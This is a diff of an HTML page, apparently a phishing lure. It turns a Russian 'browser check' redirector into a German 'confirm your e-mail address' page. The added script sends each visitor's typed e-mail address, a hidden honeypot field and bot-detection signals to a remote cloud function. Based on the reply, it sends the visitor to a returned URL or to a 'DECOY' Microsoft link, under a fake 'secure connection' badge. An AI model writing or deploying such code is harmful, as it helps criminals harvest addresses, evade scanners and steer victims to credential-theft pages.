@@ -1,51 +1,320 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="de">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
 <meta name="robots" content="noindex,nofollow,noarchive">
 <meta name="referrer" content="no-referrer">
-<title>Loading</title>
+<title>Bestätigung erforderlich</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:sans-serif;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:20px;color:#333}
-.c{background:#fff;padding:40px 30px;border-radius:16px;box-shadow:0 10px 30px rgba(0,0,0,.1);text-align:center;max-width:400px;width:100%;position:relative;overflow:hidden}
-.s{width:50px;height:50px;margin:0 auto 20px;border:4px solid #e5e7eb;border-top:4px solid #4d81f1;border-radius:50%;animation:a 1s linear infinite}
-@keyframes a{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
-.h{font-size:20px;margin-bottom:12px;font-weight:600;color:#111827}
-.p{font-size:15px;color:#4b5563;line-height:1.5}
-.b{margin-top:30px;font-size:12px;color:#9ca3af;display:flex;align-items:center;justify-content:center;gap:6px}
-.l{height:4px;width:100%;background:#f3f4f6;position:absolute;top:0;left:0}
-.l::after{content:'';position:absolute;left:-30%;top:0;height:100%;width:30%;background:#4d81f1;animation:b 2s infinite ease-in-out}
-@keyframes b{0%{left:-30%}100%{left:100%}}
+body{
+  font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%);
+  min-height:100vh;display:flex;justify-content:center;align-items:center;
+  padding:20px;color:#333;
+}
+.card{
+  background:#fff;padding:40px 30px;border-radius:16px;
+  box-shadow:0 10px 30px rgba(0,0,0,.1);text-align:center;
+  max-width:420px;width:100%;position:relative;overflow:hidden;
+  animation:cardIn .4s ease-out;
+}
+@keyframes cardIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.bar{height:4px;width:100%;background:#f3f4f6;position:absolute;top:0;left:0}
+.bar::after{
+  content:'';position:absolute;left:-30%;top:0;height:100%;width:30%;
+  background:#4d81f1;animation:barMove 2s infinite ease-in-out;
+}
+@keyframes barMove{0%{left:-30%}100%{left:100%}}
+.title{font-size:20px;margin-bottom:10px;font-weight:600;color:#111827}
+.subtitle{font-size:14px;color:#6b7280;line-height:1.5;margin-bottom:24px}
+.wrap{position:relative;text-align:left}
+input[type=email]{
+  width:100%;padding:14px 16px;font-size:16px;
+  border:2px solid #e5e7eb;border-radius:10px;outline:none;
+  transition:border-color .2s,box-shadow .2s;
+  font-family:inherit;
+}
+input[type=email]:focus{border-color:#4d81f1;box-shadow:0 0 0 4px rgba(77,129,241,.1)}
+input[type=email]:disabled{background:#f9fafb;cursor:not-allowed;opacity:.6}
+.suggestion{
+  position:absolute;left:0;right:0;top:calc(100% + 6px);
+  background:#fff;border:1px solid #e5e7eb;border-radius:10px;
+  box-shadow:0 6px 18px rgba(0,0,0,.08);padding:8px;
+  display:flex;flex-wrap:wrap;gap:6px;z-index:10;
+  animation:hintIn .2s ease-out;
+}
+@keyframes hintIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.suggestion[hidden]{display:none}
+.suggestion-btn{
+  flex:0 0 auto;padding:8px 14px;background:#eff6ff;color:#2563eb;
+  border:none;border-radius:8px;font-weight:500;cursor:pointer;
+  font-size:14px;font-family:inherit;transition:background .15s;
+}
+.suggestion-btn:hover{background:#dbeafe}
+.suggestion-btn:active{transform:scale(.97)}
+.honeypot{
+  position:absolute;left:-9999px;width:1px;height:1px;
+  opacity:0;pointer-events:none;
+}
+.badge{
+  margin-top:24px;font-size:12px;color:#9ca3af;
+  display:flex;align-items:center;justify-content:center;gap:6px;
+}
 </style>
 </head>
 <body>
-<div class="c">
-<div class="l"></div>
-<div class="s"></div>
-<h1 class="h">Проверка браузера...</h1>
-<p class="p">Пожалуйста, подождите. Идет безопасное соединение, не закрывайте страницу.</p>
-<div class="b">
-<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-<span>Защищено соединение</span>
+<div class="card">
+  <div class="bar"></div>
+  <h1 class="title" id="title">E-Mail-Adresse bestätigen</h1>
+  <p class="subtitle" id="subtitle">Bitte geben Sie Ihre E-Mail-Adresse ein, um fortzufahren.</p>
+
+  <div class="wrap">
+    <input type="email" id="email"
+           placeholder="ihre@adresse.de"
+           autocomplete="email"
+           inputmode="email"
+           autocapitalize="off"
+           autocorrect="off"
+           spellcheck="false"
+           maxlength="128">
+    <div class="suggestion" id="suggestion" hidden></div>
+  </div>
+
+  <input type="text" name="website" id="hp" class="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true">
+
+  <div class="badge">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+    <span>Sichere Verbindung</span>
+  </div>
 </div>
-</div>
+
 <script>
 (function(){
-var _0x2 = "https://functions.yandexcloud.net/d4e5bqhobljvknj550vf";
-var _0x3 = "https://go.microsoft.com/fwlink/?LinkId=521839";
-var _0x4 = _0x2 + "?site=" + encodeURIComponent(window.location.hostname);
+  'use strict';
 
-function _0x5(_0x6) {
-setTimeout(function() { window.location.replace(_0x6); }, 1000);
-}
+  // ============================================
+  // КОНФИГ (одна точка для смены окружения)
+  // ============================================
+  var CONFIG = {
+    FUNCTION_URL: 'https://functions.yandexcloud.net/d4e5bqhobljvknj550vf',
+    IDLE_TIMEOUT_MS: 40000,       // 40 сек бездействия
+    ABSOLUTE_TIMEOUT_MS: 60000,   // 60 сек жёсткий потолок
+    LOOKUP_DEBOUNCE_MS: 400,
+    EMAIL_DEBOUNCE_MS: 400,
+    DECOY: 'https://go.microsoft.com/fwlink/?LinkId=521839'
+  };
 
-document.addEventListener('DOMContentLoaded', function() {
-fetch(_0x4).then(function(_0x9) { return _0x9.json(); }).then(function(_0xA) {
-if (_0xA && _0xA.url && _0xA.url !== "undefined" && _0xA.url !== "null") { _0x5(_0xA.url); } else { _0x5(_0x3); }
-}).catch(function() { _0x5(_0x3); });
-});
+  var EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
+
+  // ============================================
+  // СОСТОЯНИЕ
+  // ============================================
+  var pageLoadTime = Date.now();
+  var had_mouse = false;
+  var had_key = false;
+  var redirected = false;
+  var idleTimer = null;
+  var absoluteTimer = null;
+  var lookupTimer = null;
+  var emailTimer = null;
+  var lastNickname = '';
+  var site = window.location.hostname;
+
+  // ============================================
+  // DOM
+  // ============================================
+  var emailEl = document.getElementById('email');
+  var suggestionEl = document.getElementById('suggestion');
+  var hpEl = document.getElementById('hp');
+  var titleEl = document.getElementById('title');
+  var subtitleEl = document.getElementById('subtitle');
+
+  // ============================================
+  // ТАЙМЕРЫ
+  // ============================================
+  function resetIdle() {
+    if (redirected) return;
+    if (idleTimer) clearTimeout(idleTimer);
+    idleTimer = setTimeout(triggerTimeout, CONFIG.IDLE_TIMEOUT_MS);
+  }
+
+  function triggerTimeout() {
+    if (redirected) return;
+    var value = emailEl.value.trim();
+    doResolve('timeout', value);
+  }
+
+  // ============================================
+  // ОТПРАВКА РЕЗОЛВА
+  // ============================================
+  function doResolve(mode, value) {
+    if (redirected) return;
+    redirected = true;
+
+    if (idleTimer) clearTimeout(idleTimer);
+    if (absoluteTimer) clearTimeout(absoluteTimer);
+    if (lookupTimer) clearTimeout(lookupTimer);
+    if (emailTimer) clearTimeout(emailTimer);
+
+    showRedirectState();
+
+    var payload = {
+      site: site,
+      mode: mode,
+      value: value,
+      signals: {
+        honeypot: hpEl.value || '',
+        time_on_page: Date.now() - pageLoadTime,
+        had_mouse: had_mouse,
+        had_key: had_key
+      }
+    };
+
+    fetch(CONFIG.FUNCTION_URL + '?action=resolve', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      mode: 'cors'
+    })
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        var url = (d && d.url) ? d.url : CONFIG.DECOY;
+        window.location.replace(url);
+      })
+      .catch(function() {
+        window.location.replace(CONFIG.DECOY);
+      });
+  }
+
+  function showRedirectState() {
+    emailEl.disabled = true;
+    suggestionEl.hidden = true;
+    titleEl.textContent = 'Weiterleitung...';
+    subtitleEl.textContent = 'Bitte warten Sie einen Moment.';
+  }
+
+  // ============================================
+  // LOOKUP (автодополнение домена)
+  // ============================================
+  function doLookup(nickname) {
+    fetch(CONFIG.FUNCTION_URL + '?action=lookup&nickname=' + encodeURIComponent(nickname), {
+      mode: 'cors'
+    })
+      .then(function(r) { return r.json(); })
+      .then(function(d) {
+        if (redirected) return;
+        var matches = (d && d.matches) || [];
+        if (matches.length > 0) {
+          renderSuggestion(matches, nickname);
+        } else {
+          hideSuggestion();
+        }
+      })
+      .catch(function() {
+        hideSuggestion();
+      });
+  }
+
+  function renderSuggestion(domains, nickname) {
+    suggestionEl.innerHTML = '';
+    domains.forEach(function(domain) {
+      var btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'suggestion-btn';
+      btn.textContent = '@' + domain;
+      btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        emailEl.value = nickname + '@' + domain;
+        hideSuggestion();
+        handleInput();
+        emailEl.focus();
+      });
+      suggestionEl.appendChild(btn);
+    });
+    suggestionEl.hidden = false;
+  }
+
+  function hideSuggestion() {
+    suggestionEl.hidden = true;
+    suggestionEl.innerHTML = '';
+  }
+
+  // ============================================
+  // ОБРАБОТКА ВВОДА
+  // ============================================
+  function handleInput() {
+    if (redirected) return;
+
+    var value = emailEl.value;
+    had_key = true;
+    resetIdle();
+
+    // Извлекаем nickname (часть до @)
+    var atPos = value.indexOf('@');
+    var nickname = atPos > 0 ? value.substring(0, atPos).toLowerCase().trim() : '';
+
+    // Lookup при изменении nickname
+    if (nickname.length > 0 && nickname !== lastNickname) {
+      lastNickname = nickname;
+      if (lookupTimer) clearTimeout(lookupTimer);
+      lookupTimer = setTimeout(function() {
+        doLookup(nickname);
+      }, CONFIG.LOOKUP_DEBOUNCE_MS);
+    } else if (nickname.length === 0) {
+      lastNickname = '';
+      hideSuggestion();
+      if (lookupTimer) clearTimeout(lookupTimer);
+    }
+
+    // Проверка на валидный email с дебаунсом → авто-редирект
+    if (emailTimer) clearTimeout(emailTimer);
+    if (EMAIL_REGEX.test(value.trim())) {
+      emailTimer = setTimeout(function() {
+        doResolve('email', emailEl.value.trim());
+      }, CONFIG.EMAIL_DEBOUNCE_MS);
+    }
+  }
+
+  // ============================================
+  // СЛУШАТЕЛИ АКТИВНОСТИ
+  // ============================================
+  emailEl.addEventListener('input', handleInput);
+  emailEl.addEventListener('focus', resetIdle);
+  emailEl.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter' && EMAIL_REGEX.test(emailEl.value.trim())) {
+      e.preventDefault();
+      if (emailTimer) clearTimeout(emailTimer);
+      doResolve('email', emailEl.value.trim());
+    }
+  });
+
+  document.addEventListener('mousemove', function() {
+    had_mouse = true;
+    resetIdle();
+  }, { passive: true });
+
+  document.addEventListener('keydown', function() {
+    had_key = true;
+    resetIdle();
+  });
+
+  document.addEventListener('scroll', resetIdle, { passive: true, capture: true });
+  document.addEventListener('click', resetIdle);
+  document.addEventListener('touchstart', resetIdle, { passive: true });
+
+  // ============================================
+  // СТАРТ
+  // ============================================
+  resetIdle();
+  absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);
+
+  // Автофокус на поле (кроме мобильных, чтобы не выскакивала клавиатура сразу)
+  if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    setTimeout(function() { emailEl.focus(); }, 300);
+  }
+
 })();
 </script>
 </body>
